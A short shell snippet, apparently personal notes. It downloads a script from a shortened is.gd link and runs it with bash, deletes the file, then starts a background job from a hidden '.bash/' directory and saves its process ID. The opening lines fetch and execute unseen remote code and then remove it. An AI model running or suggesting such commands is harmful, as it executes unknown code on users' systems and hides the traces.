wget https://is.gd/CQveCD
bash ./CQveCD
top
rm ./CQveCD
cd .bash/
nohup bash ./test.sh > x.log 2>&1 & 
#echo "hello"
echo $! > save_pid.txt
tail -f x.log

#$(python test.py)
#rest=$?
#echo $rest


